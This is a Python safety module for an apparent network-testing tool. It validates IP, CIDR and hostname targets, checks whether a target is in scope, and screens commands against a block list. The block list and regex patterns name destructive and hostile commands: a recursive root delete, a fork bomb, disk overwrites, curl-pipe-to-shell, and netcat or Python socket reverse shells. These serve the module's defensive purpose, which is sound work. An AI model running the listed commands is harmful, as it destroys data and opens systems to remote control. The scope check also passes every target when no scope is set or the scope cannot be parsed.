"""Safety - Input validation and safety checks for commands."""

import re
from typing import Optional


class SafetyChecker:
    """Validate commands and inputs for safety."""

    # Dangerous commands that should never be run
    BLOCKED_COMMANDS = [
        "rm -rf /",
        "rm -rf /*",
        ":(){:|:&};:",  # fork bomb
        "mkfs",
        "dd if=",
        "> /dev/sda",
        "chmod -R 777 /",
        "wget http://malware",
        "curl http://malware | sh",
    ]

    # Patterns that indicate potentially dangerous commands
    WARNING_PATTERNS = [
        (r"rm\s+-rf\s+/", "Recursive delete from root"),
        (r"chmod\s+777", "World-writable permissions"),
        (r"wget.*\|\s*(ba)?sh", "Download and execute"),
        (r"curl.*\|\s*(ba)?sh", "Download and execute"),
        (r"nc\s+-l", "Listening netcat (reverse shell?)"),
        (r"python.*-c.*socket", "Python socket (reverse shell?)"),
    ]

    @classmethod
    def is_safe(cls, command: str) -> tuple[bool, str]:
        """Check if a command is safe to execute.

        Returns (is_safe, reason).
        """
        command_lower = command.lower().strip()

        # Check blocked commands
        for blocked in cls.BLOCKED_COMMANDS:
            if blocked in command_lower:
                return False, f"Blocked: matches dangerous pattern '{blocked}'"

        # Check warning patterns
        for pattern, description in cls.WARNING_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                return False, f"Warning: {description}"

        return True, "OK"

    @classmethod
    def validate_target(cls, target: str) -> tuple[bool, str]:
        """Validate a target IP or CIDR."""
        if not target:
            return False, "Target cannot be empty"

        # CIDR notation
        cidr_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$"
        if re.match(cidr_pattern, target):
            parts = target.split("/")[0].split(".")
            for part in parts:
                if int(part) > 255:
                    return False, f"Invalid IP address: {target}"
            return True, "Valid CIDR"

        # Single IP
        ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
        if re.match(ip_pattern, target):
            parts = target.split(".")
            for part in parts:
                if int(part) > 255:
                    return False, f"Invalid IP address: {target}"
            return True, "Valid IP"

        # Hostname
        hostname_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$"
        if re.match(hostname_pattern, target):
            return True, "Valid hostname"

        return False, f"Invalid target format: {target}"

    @classmethod
    def sanitize_command(cls, command: str) -> str:
        """Sanitize a command for safe execution."""
        # Remove any null bytes
        command = command.replace("\x00", "")

        # Remove any control characters except newline and tab
        command = re.sub(r"[\x01-\x08\x0b\x0c\x0e-\x1f\x7f]", "", command)

        return command.strip()

    @classmethod
    def check_scope(cls, target: str, scope: str = None) -> tuple[bool, str]:
        """Check if a target is within scope."""
        if not scope:
            return True, "No scope defined"

        # Parse scope CIDR
        scope_match = re.match(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/(\d{1,2})", scope)
        if not scope_match:
            return True, "Scope not in CIDR format"

        scope_network = scope_match.group(1)
        scope_bits = int(scope_match.group(2))

        # Parse target IP
        target_match = re.match(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", target)
        if not target_match:
            return True, "Target is not an IP address"

        target_ip = target_match.group(1)

        # Convert to integers and check subnet
        def ip_to_int(ip: str) -> int:
            parts = ip.split(".")
            return (int(parts[0]) << 24) + (int(parts[1]) << 16) + (int(parts[2]) << 8) + int(parts[3])

        scope_int = ip_to_int(scope_network)
        target_int = ip_to_int(target_ip)
        mask = (0xFFFFFFFF << (32 - scope_bits)) & 0xFFFFFFFF

        if (scope_int & mask) == (target_int & mask):
            return True, "Target is in scope"

        return False, f"Target {target} is outside scope {scope}"
